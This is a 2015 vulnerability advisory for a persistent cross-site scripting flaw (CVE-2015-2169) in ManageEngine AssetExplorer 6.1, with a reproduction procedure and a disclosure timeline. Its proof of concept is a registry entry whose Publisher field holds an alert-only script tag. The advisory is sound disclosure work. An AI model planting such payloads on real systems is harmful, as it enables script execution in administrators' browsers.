@@ -1,0 +1,99 @@
+Title:
+===============
+ManageEngine Asset Explorer v6.1 - XSS Vulnerability
+
+
+CVE-ID:
+====================================
+CVE-2015-2169
+
+
+CVSS:
+====================================
+3.5
+
+
+Product & Service Introduction (Taken from their homepage):
+====================================
+ManageEngine AssetExplorer is a web-based IT Asset Management (ITAM)
+software that helps you monitor and manage assets in your network from
+Planning phase to Disposal phase. AssetExplorer provides you with a number
+of ways to ensure discovery of all the assets in your network. You can
+manage software & hardware assets, ensure software license compliance and
+track purchase orders & contracts - the whole nine yards! AssetExplorer is
+very easy to install and works right out of the box.
+
+(Homepage: https://www.manageengine.com/products/asset-explorer/ )
+
+
+Abstract Advisory Information:
+==============================
+Cross site scripting attack can be performed on the manage engine asset
+explorer. If the 'publisher' name contains vulnerable script, it gets
+executed in the browser.
+
+
+Affected Products:
+====================
+Manage Engine
+Product: Asset Explorer - Web Application 6.1.0 (Build 6112)
+
+
+Severity Level:
+====================
+Medium
+
+
+Technical Details & Description:
+================================
+Add a vendor with a script in it to the registry.
+Login to the product,
+Scan the endpoint where the registry is modified.
+In the right pane, go to software->Scanned Software
+
+The script gets executed.
+
+Vulnerable Product(s):
+ManageEngine Asset Explorer
+
+Affected Version(s):
+Version 6.1.0 / Build Number 6112
+(Earlier versions i did not test)
+
+Vulnerability Type(s):
+Persistent Cross Site Scripting
+
+
+PoC:
+=======================
+Add the following registry entry in the machine, for targeted attack.
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Fake_Software]
+"DisplayName"="A fake software 2 installed"
+"UninstallString"="C:\\Program Files\\fake\\uninst.exe"
+"DisplayVersion"="0.500.20"
+"URLInfoAbout"="http://www.dummy.org"
+"Publisher"="<script> alert(\"XSS\"); </script>"
+
+
+Security Risk:
+==================
+Medium.
+
+
+Credits & Authors:
+==================
+Suraj Krishnaswami (suraj.krishnaswami@gmail.com)
+
+
+Timeline:
+==================
+Discovered at Wed, March 3, 2015
+Informed manage engine about the vulnerability: March 4, 2015
+Case moved to development team: March 4, 2015
+Asked for updates: March 9, 2015
+Asked for updates: March 13, 2015
+Asked for updates: April 14, 2015
+Public Disclosure at Mon, June 22, 2015
